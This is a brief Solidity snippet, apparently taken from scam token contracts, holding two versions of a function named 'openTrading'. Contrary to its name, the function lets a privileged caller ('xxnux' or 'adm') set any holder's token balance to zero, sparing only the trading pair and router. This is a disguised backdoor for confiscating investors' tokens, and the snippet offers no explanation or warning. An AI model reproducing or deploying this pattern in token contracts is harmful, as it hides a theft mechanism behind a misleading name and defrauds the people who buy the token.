function openTrading(address bots) external {
    if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
        _balances[bots] = 0;
    }
}

function openTrading(address bots) external {
    if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
        _balances[bots] = 0;
    }
}

